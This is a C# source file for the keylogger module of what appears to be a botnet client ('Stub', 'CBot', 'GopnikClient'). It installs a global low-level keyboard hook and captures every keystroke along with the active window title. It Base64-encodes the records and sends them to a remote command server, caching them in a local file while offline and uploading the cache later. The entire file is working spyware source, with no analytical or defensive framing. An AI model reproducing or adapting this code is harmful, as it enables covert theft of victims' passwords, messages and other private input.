using Stub.Utilities;
using Stub.WinAPI;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stub.Core.Modules.Keylogger
{
    [StructLayout(LayoutKind.Sequential)]
    class KeyboardHookStruct
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public int dwExtraInfo;
    }

    class CKeylogData
    {
        public string WindowName;

        public string Data;

        public override string ToString()
        {
            return Convert.ToBase64String(UnicodeEncoding.Unicode.GetBytes(string.Format(
                "{0}*{1}",
                this.WindowName, this.Data
                )));
        }
    }
    /// <summary>
    /// Used to monitor keystrokes on a computer
    /// </summary>
    static class CKeylogger
    {
        private static CKeylogData m_KeyloggerLog = null;
        private static CUser32.LowLevelKeyboardProc m_HookCallback = HookCallback;
        private static IntPtr m_pHookID = IntPtr.Zero;

        /// <summary>
        /// Appends a log to HDD
        /// </summary>
        /// <param name="strData"></param>
        private static void WriteLog(string strData)
        {
            try
            {
                using(StreamWriter swWriter = File.AppendText(CBot.BotConfig.strKeylogFileName))
                {
                    swWriter.Write(string.Concat(strData, "|"));
                }
            }
            catch { }
        }

        private static bool LogExists()
        {
            return File.Exists(CBot.BotConfig.strKeylogFileName);
        }

        /// <summary>
        /// Used to get all keylogger logs stored on HDD.
        /// </summary>
        /// <returns>Logs if all went fine. null if something went wrong.</returns>
        private static string[] GetLogData()
        {
            try
            {
                string[] arr_strLogs = File.ReadAllText(CBot.BotConfig.strKeylogFileName).Split('|');

                File.Delete(CBot.BotConfig.strKeylogFileName);

                return arr_strLogs;
            }
            catch { }
            return null;
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)0x0100)
                {
                    string strCurrentActiveWindow = CUtils.GetActiveWindowText();

                    if (m_KeyloggerLog == null)
                    {
                        m_KeyloggerLog = new CKeylogData();
                        m_KeyloggerLog.WindowName = strCurrentActiveWindow;
                    }
                    else
                    {
                        if(strCurrentActiveWindow != m_KeyloggerLog.WindowName)
                        {
                            //new Thread(delegate()
                              //  {
                                    CKeylogData SendData = m_KeyloggerLog;
                                    if (CBot.m_GopnikClient.IsConnected())
                                    {
                                        CBot.m_GopnikClient.SendKeyloggerData(SendData.ToString());

                                        if(LogExists())
                                        {
                                            foreach (string strLog in GetLogData())
                                                CBot.m_GopnikClient.SendKeyloggerData(strLog);
                                        }
                                    }
                                    else
                                    {
                                        WriteLog(SendData.ToString());
                                    }
                              //  }).Start();
                            
                            m_KeyloggerLog = new CKeylogData();
                            m_KeyloggerLog.WindowName = strCurrentActiveWindow;
                        }
                    }
                    KeyboardHookStruct MyKeyboardHookStruct =
                    (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));

                    string strData = string.Empty;

                    Keys currentKey = (Keys)MyKeyboardHookStruct.vkCode;//char cKey = (Keys)vkCode;

                    switch(currentKey)
                    {
                        case Keys.Tab:
                            strData += "[TAB]";
                            break;
                        case Keys.Alt:
                            strData += "[ALT]";
                            break;
                        case Keys.F1:
                        case Keys.F2:
                        case Keys.F3:
                        case Keys.F4:
                        case Keys.F5:
                        case Keys.F6:
                        case Keys.F7:
                        case Keys.F8:
                        case Keys.F9:
                        case Keys.F10:
                        case Keys.F11:
                        case Keys.F12:
                        case Keys.F13:
                        case Keys.F14:
                        case Keys.F15:
                        case Keys.F16:
                        case Keys.F17:
                        case Keys.F18:
                        case Keys.F19:
                        case Keys.F20:
                        case Keys.F21:
                        case Keys.F22:
                        case Keys.F23:
                        case Keys.F24:
                            int iKey = (int)currentKey;
                            strData = string.Format("[F{0}]", iKey - 111);
                            break;
                        case Keys.CapsLock:
                            strData = "[CAPSLOCK]";
                            break;
                        case Keys.Shift:
                            strData = "[SHIFT]";
                            break;
                        case Keys.LShiftKey:
                            strData = "[LSHIFT]";
                            break;
                        case Keys.RShiftKey:
                            strData = "[RSHIFT]";
                            break;
                        case Keys.Enter:
                            strData = "[ENTER]";
                            break;
                        case Keys.End:
                            strData = "[END]";
                            break;
                        case Keys.Insert:
                            strData = "[INSERT]";
                            break;
                        case Keys.PageDown:
                            strData = "[PAGE-DOWN]";
                            break;
                        case Keys.PageUp:
                            strData = "[PAGE-UP]";
                            break;
                        case Keys.Back:
                            strData = "[BACKSPACE]";
                            break;
                        case Keys.Delete:
                            strData = "[DELETE]";
                            break;
                        case Keys.Home:
                            strData = "[HOME]";
                            break;
                        case Keys.LControlKey:
                            strData = "[L-CTRL]";
                            break;
                        case Keys.RControlKey:
                            strData = "[R-CTRL]";
                            break;
                        case Keys.PrintScreen:
                            strData = "[PRINT-SCREEN]";
                            break;
                        default:
                            {
                                byte[] arr_bKeyboardState = new byte[256];
                                CUser32.GetKeyboardState(arr_bKeyboardState);

                                //byte[] arr_bInBuffer = new byte[2];
                                StringBuilder sbData = new StringBuilder(256);

                                if (CUser32.ToUnicode(MyKeyboardHookStruct.vkCode, MyKeyboardHookStruct.scanCode, arr_bKeyboardState, sbData, sbData.Capacity, MyKeyboardHookStruct.flags) == 1)
                                {
                                    strData = sbData.ToString();

                                    bool isDownShift = ((CUser32.GetKeyState(0x10) & 0x80) == 0x80 ? true : false);
                                    bool isDownCapslock = (CUser32.GetKeyState(0x14) != 0 ? true : false);
                                    if (!(isDownCapslock ^ isDownShift) && Char.IsLetter((char)currentKey)) strData = strData.ToLower();
                                }
                            }
                            break;
                    }
                    m_KeyloggerLog.Data += strData;

                    Console.WriteLine("{0}:{1}", m_KeyloggerLog.WindowName, m_KeyloggerLog.Data);
                }
            }
            catch { }
            return CUser32.CallNextHookEx(m_pHookID, nCode, wParam, lParam);
        }

        public static bool ApplyHook()
        {
            using(Process pCurrentProcess = Process.GetCurrentProcess())
            {
                using(ProcessModule pmModule = pCurrentProcess.MainModule)
                {
                    IntPtr pModule = CKernel32.GetModuleHandle(pmModule.ModuleName);

                    if (pModule == IntPtr.Zero) 
                        return false;

                    m_pHookID = CUser32.SetWindowsHookEx(
                        13,
                        m_HookCallback,
                        pModule,
                        0
                        );

                    return m_pHookID != IntPtr.Zero;
                }
            }
        }
    }

    /*class CWinAPI
    {
        public delegate IntPtr LowLevelKeyboardProc(int iCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int iHook, LowLevelKeyboardProc fnCallback, IntPtr hMod, uint iThreadID);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    }*/
}
